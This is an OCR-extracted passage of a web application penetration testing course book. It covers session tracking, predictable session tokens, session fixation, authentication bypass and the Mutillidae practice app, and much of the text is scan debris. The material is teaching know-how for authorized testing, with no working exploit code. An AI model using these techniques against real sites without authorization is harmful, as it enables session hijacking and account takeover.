fancy and create their own session management system, they often miss something. In these cases, the attacker 
has an opportunity to break the application. 
Popular methods include cookies, URL parameters, and hidden form fields. 
6 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-' 
'---" 
'---" 
'-.../ . 
'-.../ 
'---' 
'-.../ 
'---' 
'-' 
'---" 
'---' 
'-' 
'---" 
'---' 
'---" 
'---' 
'---' 
'-' 
'-' 
'-' 
'-' 
Session Tracking 
Server-side code uses some form of data stored in the browser to 
track sessions 
• The server code then tracks this data between requests 
• Data is passed between the client and the server 
• Typically, the data is some form of identifier 
The server can set whatever data it wants 
• Might even send all session variables 
The client is trusted to send the data back unchanged 
To track sessions, a token, numeric identifier, or other unique information is passed between the client and the 
server. 
Usually, applications use a single identifier as the token, session ID, or numeric data in order to track sessions. 
That said, the developer of the application is free to use whatever he or she likes. For example, some developers 
pass every piece of information they need to the client and back again. Of course, they trust that the client will 
not change this data before sending it back to the server. (Insert evil laugh here.) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
7 
'--./ 
'--./ 
'-,I 
Types of Sessions: Client-Side .vs. Ser.ver-Side 
Client-side: All session data is sent to the client 
• Very nice for the attacker because any variables can be altered 
• The application trusts the client not to alter these variables 
All session data 
is sent here as 
cookie values 01 
hidden form 
fields 
All session variables are sent to client 
Server-side: Session is maintained on the server 
• Session ID matched to server data 
• This one variable can still be altered 
Single session 
ID variable 
stored here 
One session ID is sent to client 
Application 
sends data to 
the client 
Web Server 
Session data is stored 
on the server. A session 
ID is generated and 
when a request with 
that session ID is 
\_I 
'--./ 
\_; 
'--./ 
'--./ 
'--" 
'--" 
All of these mechanisms for passing session state are used to support one of two types of sessions: 
Client-side 
• 
Server-side 
Client-side: 
In client-side sessions, the application sends all the session data to the client, and the client sends it back 
unchanged. This lowers the overhead on the server and enables the application to be load-balanced across 
multiple servers, without having to be specially configured to support persistent sessions across the various 
servers. 
Client-side sessions bode well for attackers because the server trusts the client completely. 
Server-side: 
In server-side sessions, all of the session data is stored on the server. A session ID is passed between the client 
and the server. Sometimes, the server will still pass the session data to the client for GUI support or user 
friendliness, but in secure applications, this data is untrusted when it is returned and verified against the server 
version. 
8 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'--" 
'--' 
'-" 
'--' 
'-" 
'-" 
'--" 
'--" 
\_; 
'--./ 
'--" 
'--./ 
\_; 
'--./ 
'--' 
'--" 
'--./ 
'-,I 
'--./ 
'--" 
'-" 
'-" 
'-" 
'-" 
'--' 
'-" 
'-" 
'-" 
'--' 
'--' 
Popular 'Tracking 
• Session data is important, but how do we track? 
• Typically, a session token is passed to and from the client 
• Popular methods for tracking state: 
o Cookies 
o URI parameters 
o Hidden form fields 
• As testers, we need to evaluate these tokens 
Session data is important, but how do we track this session across requests? The platform usually provides us a 
means, but the application might override it or use its own method. 
Typically, a session token is passed to and from the client, which the server/application then uses to map to the 
session data stored on the server. 
The following are popular methods for tracking state: 
• 
Cookies 
• 
URI parameters 
• 
Hidden form fields 
As testers, we need to evaluate these tokens for problems or predictability. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
9 
'-" 
'---' 
Cookies 
Cookies are data pieces that are sent to the browser by the server 
• Sent as part of the HTIP header 
• Browser is supposed to store them without alteration, blindly passing them back to the server 
• Can be marked as "Secure" 
o This tells the browser to send the cookie only via HTTPS connections 
• Also marked with an indication for how long to store 
o Could be stored for no time, making for non-persistent cookies, stored in browser memory, disappearing when browser is closed 
As part of the request, the client will send the data back 
This allows the server to identify users and/ or sessions 
A single domain is typically limited to 50 cookies 
• Under 4 KB total 
For example: 
• Set-Cookie: USERID=zaphod; expires=Fri, 26-Feb-2021; path=/; domain=.sec542.org 
'-../ 
'-" 
'-._.; 
'-._.; 
'-" 
'-../ 
____,, 
'-..../ 
'--../ 
'--../ 
'--../ 
'--' 
A cookie is just a snippet of data that is sent from the server to the client, stored on the client, and sent back to 
the server upon request. These cookies can be stored in memory or written to disk, depending on the developer's 
purpose. Often, this information is just a session identifier, but quite often this data is more informative. For 
example, the application can store your username, so that the next time you visit, it will recognize you. 
10 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'--' 
'-' 
'-._.; 
'--' 
'-._.; 
'-../ 
'--' 
'-._.; 
.'-----" 
'-../ 
'-'' 
'-----" 
'-..../ 
'---' 
'-._.; 
'-../ 
'-----" 
'-../ 
'-.J 
'-----" 
'-.J 
'-._.; 
'-._.; 
'-._.; 
URI Parameters 
Data is placed in the URI of links 
• Param=value format 
When a user clicks a link, the browser sends the data in the URI 
back to the server 
• It sends this data in an HTIP GET request 
For example: 
• http://www.sans.org/index.php?sessionid=124534 
As mentioned previously, separate parameters are separated by & 
symbols 
Another method of passing session tokens between the server and the client is by placing them in the URI. 
Either the session token itself or the actual session data can be included in parameters and inserted into each of 
the links on the page before the page is sent to the client. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
11 
'--' 
'--' 
'---' 
Hidden Form. Fields 
Forms are used for user input 
• But they can also be pre-populated by the server in the response it sends 
back to the browser 
Form fields that are marked "hidden" are not displayed to the user 
• Forms can have a mixture of visible and hidden fields ... 
• ... Or, they can have entirely hidden fields 
• User doesn't see the form, but its values are passed back to the server as 
part of the next request 
For example, the source HTML might contain: 
• <input type="hidden" name="username" value="adent"> 
'---' 
'--../ 
'--../ 
'--' 
'-../ 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'---/ 
'--' 
'--' 
'--' 
'--' 
'--../ 
As applications are built, forms are used to accept input from the user. These forms can also include hidden 
form fields, which contain the information that the application needs passed across the session. Typically, we 
see significant information being stored in hidden form fields. Of course, this is an example of the developer 
trusting all of his or her users. 
12 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--../ 
'-../ 
'-../ 
'-..../ 
'-J 
'--../ 
...___, 
'--../ 
'-J 
'--' 
'--' 
'--../ 
'--' 
'--../ 
'--../ 
'--' 
'---" 
'-J 
'--../ 
'--' 
'--' 
'--' 
Attacker's Perspective of Session State 
• Session state is a major target 
• Multiple tools are used to attack session 
o Interception proxies provide access to sessions 
o Scripts to brute force session IDs 
• Changing session ID can: 
o Give attacker access as someone else 
o Disclose sensitive information 
o Elevate attacker's privileges 
o Muchmore! 
A session state is one of the primary attack targets for web applications. If an attacker can find a session state 
issue, many attack vectors are opened. For example, we could hijack someone else's session and perform 
functions as that person, with his or her credentials. Or we could modify the session state to indicate 
administrator-level privilege within the application. 
I\ 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
13 
\,J 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Sessiori Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass flaws 
4. Exercise: Authentication Bypass 
5. Vulnerable Web Apps: Mutillidae 
6. CommandJnjection 
7. Exercise: Command Injection 
8. File Inclusion and Ojrectory Traversal 
9. Exercise: Local/Remote File Incluslon 
IO. SQL Injection Primer 
I ! . Discovering SQli 
12. Exercise: Error-Based SQLi 
13. Exploiting sou 
14. SQLi Tools 
15. Exercise: sqlmap + ZAP 
16. Summary 
SE€542 I Web App Penetration Testing and Ethical Hacking 
14 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-.../ 
'-' 
"'-' 
'-' 
'-' 
'--..., 
'-.../ 
'-' 
Course Roadmap 
'-.../ 
Next up: Session token gathering and session fixation. 
'-' 
'-' 
,._____, 
'----' 
'-.../ 
'-' 
'-.../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-----" 
'-' 
14 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
Session Token Gathering 
• Most web applications create sessions to track a user through a series of 
interactions 
• As we explore a site to map it, the application creates sessions for us 
• These sessions typically have a session identifier variable, sometimes called a 
session token or session credential, passed to the browser 
o We should collect them to determine if they are predictable 
o If they are, an attacker may determine other users' session credentials and usurp their 
accounts 
• Various ways to collect them: 
o Manually 
o Customized scripts 
o Burp Suite 
Maintaining the concept of a "session" across many different TCP connections is commonly accomplished 
using any combination of cookies, URL parameters, hidden form fields, and IP/browser information. If we can 
understand the logic behind maintaining session state, we may manipulate it to attack the application. 
The simplest example of a session token is a cookie called USERID. If you look at your cookie USERID and it 
says your name in Fullname.Lastname notation, you may become the user "Arthur.Dent" by modifying that 
cookie to be "Arthur.Dent". Session token manipulation is based on the concept of manipulating "hidden" parts 
of your web browsing session and observing how it affects the application. If you can isolate the things that 
make up a session, either you can modify your session parameters at will (including, in some cases, whether 
you have administrative access) or you know what to grab in your XSS/CSRF attacks. 
What about a USERID cookie with the value of"S2V2aW4gSm9obnNvbg=="? How about 
"72b28b I b696ecaadfc0f212fl6809850," or "655609cdf4d93495c9f3 I 66e6d"? In order, those were Base64- 
encoded, md5sum, and hex-encoded output from crypt with the password of"abcdefg". All represent 
opportunities to manipulate the application with new session tokens of the attacker's choosing. 
Sending repeated, "new" (without session information) requests for the login page using tools like Wget, 
Python, or Netcat will normally cause the web application to generate a new session ID each time. Look for 
patterns in the generated session IDs. Are they somewhat sequential? Do they change in an identifiable pattern? 
Are there any fields which do not change? Sometimes a timestamp is encoded or encrypted, and occasionally 
seconds may be omitted, resulting in encrypted, encoded, or hashed values that remain the same for the whole 
minute. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
15 
'---' 
'---' 
Session Token variables 
Applications pass session tokens back to browsers using different 
mechanisms: 
• URL parameters passed via HTIP GET 
• Hidden form elements passed via 
HTIPPOST 
• Cookies 
Some applications use multiple means: 
• Either on separate pages 
in the app 
• Or even on the same page 
URL-Based Session 
<Input typt='hldden• name=•_vtEWSTATi:" ids"_VIEWSTA' 
V111ut="/wl!POwUKl11l2NJk30TQxNg9kf;;J~w9kFgICCQ88Kw. 
ZFZpZXcx02dk4sjERffnDXV/hMFGA!.l011QUnZbk=" /> 
Hidden Form Field-Based Session 
TTP!Ll 200 OK 
ate: Sat 20 Oec ZOOS 14:33:11 GMT 
erver. ISM_HTiP_Sewer 
et-Ceokie: JStSSION 1o~ooooekKrl 7XBE>qgOJFzDmOilhU2e3h, 9jk; Pathc f 
onnecuon: close 
Cookie-Based Session 
Ethical Hacking 
\___,/ 
'---' 
'---' 
..__, 
'---' 
..__, 
'---' 
'-' 
..__, 
..__, 
'---' 
'---" 
'---' 
'---' 
'-' 
'---' 
'---' 
Web applications often need to track session state across requests using various techniques. They may pass data 
via the URL as shown at the top with the jsessionid. They may also use hidden form fields as in the middle 
graphic where the ViewState variable is set as a hidden form input. The final method is using a cookie. At the 
bottom, we have a Set-Cookie response header creating a JSESSIONID cookie. 
Keep in mind that some applications are complex and may use multiple methods. 
16 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'---' 
'---" 
'---" 
'-' 
'-' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'----' 
'---' 
'---' 
'---' 
'-' 
Identifying Session Tokens 
Identifying standard session credentials created by application 
development environment 
• Some automated tools do this for you, such as Burp 
• Java and JSESSIONID or PHP and PHPSESSIONID 
• Determining session credentials based on their names: 
o Google is your friend! Research variable names via web searches 
o Several examples include items such as session, sessionid, or sid 
• Finding session credentials based on its behavior and intuition: 
o Observing a variable that changes for each login 
o If we remove a cookie, does the site prompt us to log in again? 
One of the steps we must do is to identify the method of passing session state. Some of the tools we use, such as 
Burp and w3af, attempt to determine this for us. But they do not always succeed. We need to look for known 
session identifiers, and if they are not found, we need to decide which variables are used. Look for variables that 
change for each login, or block a variable and see ifwe get redirected to the login page. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
17 
'-' 
Session TokeO Predictability 
Session tokens may be predictable 
Consider incremental tokens: 
• First login: 74eb2cd93f2a95ba 
• Next login: 7 4eb2cd93f2a95bb 
• Next login: 74eb2cd93f2a95bc , 
ii Why the gap? See next bullet' 
• Next login: 74eb2cd93f2a95bf 
Realize that other users may access a production site while you are sampling and you may not get the entire series; 
significant gaps may appear 
Other predictable assignments: 
• Change by fixed constant (42, 84, 126, 168, and so on) 
• Or consider: 
• c4ca4238a0b923820dcc509a6f75849b, c81e728d9d4c2f636f067f89ccl4862c} 
eccbc87e4b5ce2fe28308fd9f2a7baf3, a87ff679a2f3e7ld9181a67b7542122c 
• Other possible patterns include: 
• IDs based on client IP addresses or data from the session encoded 
Can you name the 
algorithm? If not, see 
notes. 
..._,, 
..._,, 
..._,, 
'-../ 
'-' 
'-" 
'---.,, 
..._,, 
'--' 
'-../ 
..._,, 
'-../ 
'-' 
'-.../ 
'---" 
'---" 
Session token predictability is a serious problem ifit exists within the target application. If the token can be 
predicted, an attacker could guess what session tokens have already been used and then hijack an active session. 
In this slide, we show some examples of predictable tokens. We have incremental tokens in the first pattern. The 
second pattern of hex digits on the screen is the MD5 hash of the ASCII representation of integers starting at 1. 
We see md5sum(l), md5sum(2), md5sum(3), and md5sum(4). 
We also find that if developers create their own session token, they often use client data such as the IP address 
as the token. They typically encode or hash it in some manner, but we should detect that in our testing. 
18 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-' 
..._,, 
'---" 
'-' 
..._,, 
'--' 
'-' 
'-' 
..._,, 
'--' 
'-' 
..._,, 
'-.,./ 
'---" 
'---" 
'---" 
'-.,./ 
'-.,./ 
'-.,./ 
\...., 
'-../ 
..._,, 
Manually Collecting Session Credentials 
Although this method is not used often, sometimes it is required 
• This may be because the application is complex and requires human 
interaction or has issues with automated tools 
As you browse the site, record the session credentials 
• Flat file or spreadsheet works well 
Analysis can then be done using Excel or Cale 
Although it may seem like a waste to mention this, I have tested sites that for various reasons could not 
withstand a scripted tool and I needed to manually record the various session tokens I came across. This is not 
common and is usually a problem the application owner needs to fix. But keep this in mind if you ever come 
across one of these types of applications. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
19 
\.._.; 
\.._.; 
Collecting. Session .Credential.s.· via Customized Scripts 
• Another place to keep in mind is scripts 
• As we discussed earlier, many times we write a custom script to 
perform some action repeatedly or iteratively 
• Add a portion to log the session tokens found 
• This log can then be analyzed 
\.._.; 
'---,I 
'---,I 
'--../ 
\..._,, 
'----' 
'---,I 
'---,I 
'-" 
'---,I 
'-" 
'---,I 
'-.__.; 
'-" 
A second method would be to add the function to any script the attacker is using to write the session token to a 
file. That file can then be read into spreadsheet tools such as Excel to generate charts and graphs like the ones 
from Burp. 
20 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
, __ _,, 
'---,I 
'----' 
'----' 
'----' 
'----' 
'-.__.; 
'----' 
'-.__.; 
'---,I 
'----' 
'-.__.; 
\.._.; 
\.._.; 
'----" 
'---,I 
'-.__.; 
'---,I 
\.._.; 
'----" 
'--../ 
'-.__.; 
'---,I 
'--" 
'---' 
'-...,I
Burp Sequencer Session Analysis 
• Burp Suite also contains a sequencer 
to analyze 
session tokens 
• We seed it URLs by proxying 
• The sequencer runs many 
different tests 
o It provides easy-to-understand 
descriptions of the tests 
• We can also load a file of tokens to 
analyze 
o This allows us to analyze any data that is 
supposedly random 
(fJ Se'.ect Live capture Request 
Send requ~sti hem from other toots to configure a b.:e captur~. Seiect the 
configure the other options belo-N, then diek ~start !We eaprure ... 
1~1 
C""cioar j 
Compar~r 
Optt0""1 
Ai:ert.s 
S,e)i;ct the bcat!vn in the response where the token appears, 
[ sid-U0ibWf2686Q1S21 e2lil ... 
Burp Suite also contains a session token analyzer. It is called Sequencer. We can seed it the requests we need 
analyzed by using the Burp Proxy. After we browse to the page that creates the session token, we can right-click 
it in the Target tab. We then select Send to Sequencer. On the Sequencer tab, we can identify the token, either 
by allowing Burp to determine it or by manually selecting it. We can also load tokens from a file. This allows us 
to take any type of token and determine its randomness. For example, if the target site allows for digital 
downloads and randomizes the filename, we would take samples of the filenames and load them from a file. One 
of the other nice features of the Sequencer is the number of tests it runs. It does an excellent job of explaining 
what the tests are doing, including explanations of the math for us mere mortals. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
21 
...___,, 
...___,, 
Se~sio11 Flaws beye>nd f1ath 
• Session state is a high-value target in web applications 
• We could potentially hijack sessions by determining predictable 
session IDs 
o More commonly session hijacking occurs as a result of successful XSS 
exploitation 
• Session fixation, which is covered next, presents another non- 
math-based hijack option 
"--' 
'---' 
...___,, 
'-.__,, 
'.___,I 
''-../ 
'---' 
'---' 
'---' 
'---' 
'-.__,, 
'---' 
...___,, 
'---' 
Session state is a critical point within most applications. Ifwe determine that flaws in session token generation, 
reuse, or storage exist, we might perform hijacking of a session. Although the previous discussion of session 
analysis used math to emphasize potentially weak session token generation algorithms, there are more 
commonly employed methods for hijacking a user's session. 
The most common method is to exploit an XSS flaw to steal an authenticated user's session token. Another 
option is to perform session fixation. 
22 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
\.__./ 
'---' 
'-.../ 
'-' 
'---' 
'---' 
'---' 
'---' 
'-.__,, 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-" 
'-" 
'---' 
'---' 
...___,, 
'-' 
'---' 
Session Fixation 
• Session fixation allows for us to control a user's session ID 
• The basic cause of the flaw is the session ID not being regenerated 
after a user authenticates 
• We provide a link to a user 
o The link includes the session ID 
• The user clicks the link and subsequently authenticates 
o Afterward, we can also use the session ID 
Session fixation enables us to control what session ID a user is assigned instead of attempting to predict it. The 
flaw is caused because the application assigns a session ID before authentication. Then, when the user 
authenticates, the application continues to make use of the same session token. The attacker can then receive a 
session ID from an application and send it to the victim. When the victim clicks the link and authenticates, the 
attacker can then access the site using the same ID. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
23 
\....I 
\....I 
Dis<:overing/Exple>iting Session Fixation 
Session fixation is a flaw that is simple to find 
• Often discovered during mapping an application 
Look for session identifiers sent before authentication 
• Within the interception proxy 
After authentication, compare the ID 
• Did they change after auth or not? 
If not, we might socially engineer someone into starting with our 
known/fixed session and then authenticating 
\....I 
\.J 
\....I 
'-" 
'-" 
\.J 
\.J 
\.J 
'-" 
\.J 
'---' 
'---' 
'-" 
'-" 
Discovering session fixation is actually quite easy. During the mapping phase of the testing, we should be 
looking for session tokens. We would then compare the ones we received before authentication to the ones in 
use after authentication. If the tokens are still being used, then session fixation may be possible. Exploitation in 
the wild would involve convincing someone, usually via social engineering, to start with our known and fixed 
session. 
24 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
\.J 
\.J 
'-" 
'-" 
\.J 
'-" 
\.J 
'-" 
'-" 
'--.,/ 
\.J 
'-" 
\.J 
'-" 
'-" 
\.../ 
\.J 
'-" 
'--.,/
'--.,/ 
--.J 
'--.,/
\.J 
'--.,/
-J 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
• Session Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass Flaws 
Exercise: Authentication Bypass 
5. Vulnerable Web Apps: Mutillidae 
6. Commii!nd Injection 
Exercise: Command Injection 
File Inclusion and Directory Traversal 
Exercise: local/Remote Fife 
SQl Injection Primer 
I I. Discovering SQli 
12. Exercise: Error-Based SQli 
13. Exploiting SQLi 
i 4. SQLi Tools 
S. Exercise: sqlmap + ZAP 
lo.Summary 
SEC542 I Web App Penetration Testing and Ethi 
2S 
Course Roadmap 
Our next session discusses authentication bypass. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
25 
'-' 
..__,, 
Authentication Bypass 
• This flaw allows us to access restricted content without 
authentication 
• Provides access to various items based on the flaw: 
o Access reserved functionality such as administrative consoles 
o Access to accounts other than our own 
• Exploits the lack of authentication verification within the 
application 
• We gain access to more of the application 
SEC542 I Wet,App Penetration Testing and Ethical Hacking 
26 
'-....,. 
'-' 
'-1 
'-1
'---' 
'-' 
'---' 
'---' 
'-' 
'-' 
'-" 
'-..,/ 
'-" 
.'-' 
'-" 
'---' 
As we've discussed previously, authentication bypass is when the attacker can access resources that require 
authentication without actually authenticating. This allows the attacker to gain access to portions of the 
application or data the target is trying to protect. Depending on the exposed portions, this can be a very critical 
issue in a web application. 
When a tester finds an authentication bypass issue, he or she needs to determine what it provides access to. Can 
this person get to the whole site or just a portion of it? 
26 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'---' 
'---' 
'-.../ 
'--' 
'-' 
'-.../ 
__,, 
'-1 
-._. 
'---' 
'-.../ 
'- 
'--' 
'-" 
.._,, 
'---' 
'-1 
'-' 
'---' 
'---' 
'-..,/ 
'-' 
Bypass Methods 
• Use site maps and access resources directly 
• Manually: 
o Access pages with a browser 
o Also look at URL parameters 
• Keys and IDs 
• Scripts: 
o Make this easier 
o Can brute force page names 
o Simple iteration 
o Use previous results 
There are two ways that authentication can be bypassed. One method is to manually access portions of the site 
by reviewing the site map and going to those pages directly instead of following the menu flow. The other way 
is to run scripts that brute force directory and file listings in an attempt to find valid filenames. 
Manually walking through the application is a simple way to abuse this. Use the application map from the 
previous steps. In gathering that data, you should have found keys and IDs used to reference pages. These are 
the focus of this attack. 
Of course, scripting is the best way to abuse this flaw. Simply write a script to brute force the IDs and keys 
found. You can also brute force guess page names to find pages that allow direct access when they shouldn't. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
27 
'--" 
'--' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
! . Session Tracking 
2. Session Token Gathering and Session fixation 
3. Bypass Flaws 
4. Exercise: Authentication Bypass 
S. Vulnerable Web Apps: MutiHidae 
6. Command Injection 
7. Exercise: Command Injection 
8. File Inclusion and Directory Traversal 
9. Exercise: Local/Remote File Inclusion 
I 0. SQL lrajection l!:rimer 
! I. Discovering SQLi 
12. Ex:erds1!l: Error-Based SQLi 
I l. Exploiting SQLi 
! 4. SQU Tools 
I 5. Exercise: sqlmap + ZAP 
16. Summary 
V 
'-.,./ 
"--" 
,_____,. 
'-.., 
'-.., 
"--" 
'--" 
"--" 
\...., 
'--" 
'-.,./ 
'-.., 
'-.., 
'--" 
'-..,/ 
'--" 
Course Roadmap 
'--" 
'--" 
Let's demonstrate authentication bypass hands-on using BASE. 
'--" 
'-.., 
'--" 
'--" 
'--' 
'-.., 
'-.., 
'--" 
"--" 
"--" 
'-" 
'--" 
'-../ 
'-" 
'--" 
'-" 
'--" 
'-../ 
\...., 
28 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.., 
"--" 
SECS42 Workbook:Authentication Bypass 
IJ 
Exercise 3.1: Authentication Bypass 
SECS42 !WebApp Penetration Testing and Ethical f::lacking 
29 
SEC542 Workbook: Authentication Bypass 
Please go to Exercise 3.1 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
29 
\...-I 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Session Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass Flaws 
Exercise: Authentication K"'""'"''"' 
S. Vulnerable Web Apps: Mutillidae 
6. Command Injection 
7. Exercise: Command Injection 
8. File Inclusion and Directory Traversal 
9. Exercise: Local/Remote File Inclusion 
IO. SQL Injection Primer 
i I. Discovering SQLi 
12, Exercise: Error~Based 
i 3. Exploiting SQLi 
14. SQLi Tools 
IS. Exercise: sqlmap + ZAP 
16.Summary 
SECS42 [ Web App Penetration Testing and Ethical Hacking 
Jo 
'-' 
'-.J 
'-' 
'-' 
'-' 
'-' 
\._.., 
'-' 
'-' 
'-' 
'-' 
\._.., 
'-' 
'-' 
'-' 
'-' 
Course Roadmap 
'-' 
.____, 
We will explore a wonderful, intentionally buggy web application: Mutillidae. This intro will come in handy 
during the upcoming command injection exercise. 
30 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
.____, 
'-' 
'-../ 
'-../ 
'-' 
'-' 
'-..../ 
'-' 
'-' 
'-' 
'-' 
'---' 
'-' 
'-' 
'-.../ 
'-' 
'-' 
'-"' 
'-.../ 
'-../ 
'---* 
Mutillidae 
• Mutillidae is an intentionally vulnerable set of web applications 
o Version 1.x (Mutillidae Classic) was developed by Adrian "IronGeek" 
Crenshaw (@irongeek_adc) 
o Version 2.x (NOWASP Mutillidae 2) is maintained by Jeremy Druin 
(@webpwnized) 
• Runs on LAMP /W AMP /XAMPP 
• Project page: http://sourceforge.net/projects/mutillidae/ 
• Available on the Securitygaz VM: http://mutillidae 
Both Adrian and Jeremy are former students of the course authors, and Jeremy is also currently a mentor for 
SEC542. 
Jeremy has made a number of fantastic Mutillidae videos available at 
https://www.youtube.com/user/webpwnized.1 
Mutillidae2 (NOW ASP) runs on LAMP (Linux/ Apache/MySQL/PHP), W AMP 
(Windows/Apache/MySQL/PHP) and XAMPP (Cross-platform/Apache/MySQL/PHP/Perl). 
References: 
[ l] https://www.youtube.com/user/webpwnized (https://cyber.gd/542_ 132) 
[2] http://sourceforge.net/projects/mutillidae/ (https://cyber.gd/542 _ 13 l) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
31 
-___, 
'---' 
'-' 
t-'lutillidae's OWASP Top IO Coverage 
Mutillidae provides 
coverage of the OWASP 
Top 10 2017 
'---' 
'-.../ 
Mutillidae NOW ASP provides full coverage of the OW ASP Top IO (2017): 
• 
A I Injection (SQL) 
• 
Al Injection (Other) 
• 
A2 Broken Authentication and Session Management 
• 
A3 Sensitive Data Exposure 
• 
A4 XML External Entities (XXE) 
• 
AS Broken Access Control 
• 
A6 Security Misconfiguration 
• 
A 7 Cross Site Scripting (XSS) 
• 
A8 Insecure Deserialization 
• 
A9 Using Components with Known Vulnerabilities 
• 
Al0 Insufficient Logging and Monitoring1 
Reference: 
[l] https://www.owasp.org/images/7/72/0WASP _Top_! 0-2017 _%28en%29.pdf.pdf(https://cyber.gd/542_183) 
QR 
32 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-' 
'---' 
'-' 
'-' 
'-' 
'---' 
'---' 
'---' 
'-J 
'---' 
'---' 
'---' 
'---' 
'-' 
'-..J 
'---' 
'-J 
'-J 
'---' 
'-J 
'---' 
'---' 
'-" 
'---' 
'---' 
'---' 
'-' 
'-' 
Mutillidae Security Levels 
• Mutillidae has the following security levels: 
o 0: Hack Away 
o 1: Try Slightly Harder 
o 5: Good Luck 
• Default is level 0 
• Change the security level by clicking "Toggle Security" 
~ 
Security level I enables JavaScript validation for many pages. Level 5 adds additional controls such as strong 
tokens. 
Adrian Crenshaw maintains a list of videos here, many focusing on defeating various Mutillidae security levels: 
http://www.irongeek.com/i.php?page=videos/web-application-pen-testing-tutorials-with-mutillidae1 
Reference: 
[ I ] http://www.irongeek.com/i. php ?page=vi deos/web-app lication-pen-testing-tutorials-with-muti 11 i dae 
(https://cyber.gd/542 _ I 33) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
33 
'-./ 
..__, 
Mutillidae Mints 
• There are 2 levels of hints available 
o Level o: I try Harder 
o Level 1: 5cnpt Kiddie 
• Change by clicking "Toggle Hints" 
/ 
,~ 
-:"cc 
'.'..'.C"C'!!pt~'.'::;•::,,c= 
• Level 1 Hints provide examples and 
nudges in the right direction 
- ' 
rtogg Ii Bina -· 
- 
- ~ - 
Dtctt:rmtr,e the prefoi: and s~tffo, m.'md!l::.i to- mijke &if: 
1yntat1(a!!y then ada a Phr!N;d between. 
txample {dt:fi-S not Ut1:lod<2: pr€-f!X w swffi:x): 
"fit' 
'-./ 
'-./ 
'-./ 
'-./ 
'-./ 
'-./ 
\...../ 
\...../ 
\...../ 
\...../ 
'-J 
'----' 
'-./ 
The default Mutillidae hint setting is O ("I try Harder"). You may also choose 1 ("Serl pt Kldd I e"). 
Note that Mutillidae formerly supported level 2 hints ('noob'), but they were removed as of version 2.6. 
Click "Toggle Hints" to change the setting. A "Hints" box will appear at level I. 
"- 
Switch to SOAP Web Service Version of this Page 
Name 
Password 
\...../ 
'-J 
'-J 
'-J 
..__, 
'-J 
'-J 
\...../ 
\...../ 
'-J 
'-./ 
'--' 
\...../ 
\...../ 
'-J 
Please enter userna 
to view accou 
\...../ 
\...../ 
'--' 
'--' 
'-...,, 
'--' 
\...../ 
'--./ 
-......, 
34 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
·.___,; 
Reset DB 
Click "Reset DB" to clear the database and start over fresh 
SECS42 jW® App Penetration Testing and Ethical Hacking 
35 
Click "Reset DB" to clear the database and start over fresh. This capability is quite useful for clearing out old 
attempts, which may get in the way of new hacking. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
35 
'---' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
